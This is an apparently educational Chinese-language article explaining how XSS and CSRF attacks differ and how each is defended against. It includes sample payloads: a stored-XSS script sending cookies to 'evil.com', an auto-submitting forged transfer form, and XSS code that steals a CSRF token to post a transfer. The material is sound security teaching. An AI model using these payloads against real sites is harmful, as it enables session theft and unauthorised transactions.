# XSS 攻击和 CSRF 攻击区别是什么？

## 核心概念

XSS 和 CSRF 都是 Web 安全的经典攻击，名字相似（都有“跨站”），但本质完全不同：**XSS 是“在你网站里执行恶意脚本”，CSRF 是“借你登录态发请求”**。一句话区分——XSS 是注入代码到受害者浏览器执行，CSRF 是借受害者身份向服务器发请求。

理解差异的关键在于“攻击者拿到什么”。XSS 后攻击者拿到了脚本执行权，能读 Cookie、调接口、改页面，相当于登录了用户账号；CSRF 攻击者自始至终拿不到 Cookie，只是诱导浏览器自动带 Cookie 发了个请求，能不能成功取决于服务器是否区分请求来源。所以 XSS 危害更大、范围更广，CSRF 危害更聚焦于“写操作”。

两者还有一个容易混淆的关系：**XSS 是 CSRF 的上游威胁**。一旦 XSS 拿到 CSRF Token，所有 CSRF 防护就失效了。所以防 CSRF 的前提是先防住 XSS。

## 标准回答

一句话结论：**XSS 是注入脚本在用户浏览器执行（拿 Cookie、调接口），CSRF 是诱导浏览器带 Cookie 发跨站请求（借权限改数据）；XSS 防御靠输出编码 + CSP，CSRF 防御靠 SameSite + CSRF Token + Origin 校验**。

对比要点：

| 维度 | XSS | CSRF |
|------|-----|------|
| 攻击方向 | 攻击者在受害者浏览器执行代码 | 攻击者借受害者 Cookie 向服务器发请求 |
| 攻击者是否拿到 Cookie | 能拿到 | 拿不到，只是浏览器自动带 |
| 服务器视角 | 请求是合法用户浏览器发的，看不出来 | 请求是合法用户浏览器发的，也看不出来 |
| 是否需要诱导点击 | 反射型/DOM 型需要，存储型不需要 | 通常需要诱导访问恶意页面 |
| 防御核心 | 输出编码 + CSP + HttpOnly | SameSite + CSRF Token + Origin 校验 |
| 危害范围 | 任意操作（读、写、转发、挖矿） | 只能发请求，不能读响应 |
| 是否依赖登录态 | 不一定（存储型可攻击未登录用户） | 必须用户已登录 |

## 实现原理

### XSS 触发链路（存储型示例）

```
攻击者 -> 评论框提交 <script>fetch('//evil.com?c='+document.cookie)</script>
       -> 写入数据库
       -> 受害者访问评论页
       -> 服务端未编码直接返回
       -> 受害者浏览器执行脚本 -> Cookie 上传到 evil.com
       -> 攻击者拿 Cookie 冒充登录
```

关键：脚本在受害者浏览器执行，攻击者通过脚本“间接”拿到一切。

### CSRF 触发链路（GET 型示例）

```
受害者 -> 登录 bank.com，浏览器存 SESSIONID Cookie
受害者 -> 访问 attacker.com
attacker.com 页面: <img src="https://bank.com/transfer?to=hacker&amount=10000">
       -> 浏览器请求 bank.com/transfer，自动带 SESSIONID
       -> 服务器看 Cookie，执行转账
       -> 攻击者收钱（但攻击者从头到尾没看到 SESSIONID）
```

关键：攻击者只是“借”浏览器带 Cookie 发请求，自己拿不到 Cookie，也无法读取响应（同源策略）。

### 为什么两者防御思路完全不同

**XSS 防御**针对“数据进入 HTML 上下文”：

```
不可信数据 -> 输出时按上下文编码 -> 浏览器当成文本不当代码执行
```

**CSRF 防御**针对“请求是否来自合法页面”：

```
请求进来 -> 校验来源（Origin/Referer/Token） -> 拒绝跨站伪造
```

XSS 是“不可信数据进页面”，CSRF 是“不可信来源发请求”，方向相反。

### 组合攻击：XSS + CSRF

如果站点同时有 XSS 漏洞和 CSRF Token 防护：

```javascript
// XSS 注入脚本，先读 CSRF Token 再发请求
const token = document.querySelector('meta[name=csrf-token]').content;
fetch('/api/transfer', {
  method: 'POST',
  credentials: 'same-origin',
  headers: {'X-CSRF-TOKEN': token},
  body: JSON.stringify({to: 'hacker', amount: 10000})
});
```

XSS 直接绕过 CSRF 防护。所以**没有 XSS 防护的 CSRF 防护是不完整的**。

## 代码示例

### 同一接口两类攻击的对比

假设转账接口：

```java
@PostMapping("/transfer")
public String transfer(@RequestParam String to,
                       @RequestParam BigDecimal amount,
                       HttpSession session) {
    String userId = (String) session.getAttribute("userId");
    // 仅靠 Session 鉴权
    transferService.transfer(userId, to, amount);
    return "success";
}
```

**CSRF 攻击**（攻击者页面）：

```html
<!-- 攻击者诱导已登录用户访问此页面 -->
<body onload="document.forms[0].submit()">
  <form action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="hacker">
    <input type="hidden" name="amount" value="10000">
  </form>
</body>
```

**XSS 攻击**（评论里注入）：

```html
<script>
  // 通过 XSS 直接调用接口，不需要诱导
  fetch('/transfer?to=hacker&amount=10000', {credentials: 'same-origin'})
</script>
```

### 防御代码对比

**XSS 防御**（输出编码）：

```java
import org.owasp.encoder.Encode;

// 评论展示
out.write("<div class='comment'>" + Encode.forHtml(comment.getContent()) + "</div>");
```

**CSRF 防御**（Token 校验）：

```java
@PostMapping("/transfer")
public String transfer(@RequestParam String to,
                       @RequestParam BigDecimal amount,
                       @RequestHeader("X-CSRF-TOKEN") String csrfToken,
                       HttpSession session) {
    if (!csrfTokenService.isValid(session, csrfToken)) {
        throw new ForbiddenException("Invalid CSRF token");
    }
    // ...
}
```

两者防护代码完全不同，分别针对“输出编码”和“请求来源”。

## 实战场景

| 场景 | 是 XSS 还是 CSRF | 防护要点 |
|------|------------------|----------|
| 评论里贴 `<script>` 弹窗 | XSS（存储型） | 输出 HTML 编码 + CSP |
| 转账接口被跨站表单调用 | CSRF | SameSite + Token |
| 搜索框参数回显弹窗 | XSS（反射型） | 输出编码 |
| 用 `<img>` 触发 GET 改数据 | CSRF（GET 型） | 改 POST + SameSite |
| URL hash 被 innerHTML 写入 | XSS（DOM 型） | 用 textContent |
| 已有 XSS 时 CSRF Token 被偷 | XSS 引发的 CSRF 绕过 | 先防 XSS，CSRF 是兜底 |

## 深挖追问

**Q1：用 Bearer Token 鉴权能防 CSRF，能不能防 XSS？**

防 CSRF 但不能防 XSS。Bearer Token 不放 Cookie，浏览器不会自动带，CSRF 不成立。但 XSS 注入的脚本可以通过 `localStorage.getItem('token')` 读到 Token，再以用户身份发任意请求。所以 JWT 存 localStorage 反而扩大了 XSS 的危害，部分实践改用 HttpOnly Cookie 存 Token + CSRF Token 防护。

**Q2：HttpOnly Cookie 同时防 XSS 和 CSRF 吗？**

不是。HttpOnly 让 JS 读不到 Cookie，能降低 XSS 窃取 Cookie 的危害，但挡不住 XSS 直接在登录态下发请求（浏览器自动带 Cookie），也完全不影响 CSRF（CSRF 本来也不需要读 Cookie）。HttpOnly 是降低 XSS 危害，不是 CSRF 防护。

**Q3：CSP 防哪个？**

防 XSS（限制脚本源），不防 CSRF。CSP 让注入的脚本跑不起来，但 CSRF 是 `<img>` `<form>` 触发的，不是脚本，CSP 管不到。CSP 中的 `form-action` 指令能限制表单提交目标，对 CSRF 有一定补充防护，但不是主流手段。

**Q4：SameSite Cookie 防哪个？**

防 CSRF（不让 Cookie 跨站带），不防 XSS。XSS 是同站脚本，Cookie 照样在站内有效。SameSite 是当前最有效的 CSRF 兜底防护，但旧浏览器不支持，且 Lax 模式下 GET 顶级导航仍带 Cookie。

**Q5：如果只能防一个，先防哪个？**

XSS。XSS 危害更广（能读数据、能发请求、能改页面），且 XSS 能绕过 CSRF 防护。CSRF 危害相对窄（只能发请求，不能读响应），且 SameSite Cookie 几乎零成本就能挡掉大部分。所以工程上优先做输出编码 + CSP 防 XSS，再叠加 SameSite + Token 防 CSRF。

## 易错点

- **以为两者是一回事**：XSS 注入代码，CSRF 借身份发请求，方向相反。
- **以为防了 CSRF 就防了 XSS**：CSRF Token 被 XSS 偷走就失效。
- **以为 HttpOnly 同时防两者**：HttpOnly 只防 Cookie 被 JS 读取，不防 CSRF 也不防 XSS 直接发请求。
- **以为 CSP 能防 CSRF**：CSP 防脚本注入，CSRF 用 `<img>` `<form>` 不是脚本。
- **混淆攻击者权限**：XSS 后攻击者等于登录用户，CSRF 攻击者只是诱导请求，拿不到响应。
- **认为同源策略能防 CSRF**：同源策略限制读响应，不限制发请求。CSRF 不需要读响应。

## 总结

XSS 是“在受害者浏览器执行恶意代码”，CSRF 是“借受害者身份发请求”；前者攻击者拿到执行权（危害大），后者攻击者只是借权限（危害聚焦写操作）。防御思路上 XSS 靠“输出编码 + CSP”，CSRF 靠“SameSite + Token + Origin 校验”，两者防护代码完全不重叠。XSS 是 CSRF 的上游威胁，必须先防 XSS，CSRF 防护才有意义。Bearer Token 鉴权天然防 CSRF 但放大 XSS 危害，HttpOnly Cookie 是降危害非根治。

## 参考资料

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [MDN: SameSite Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite)

---
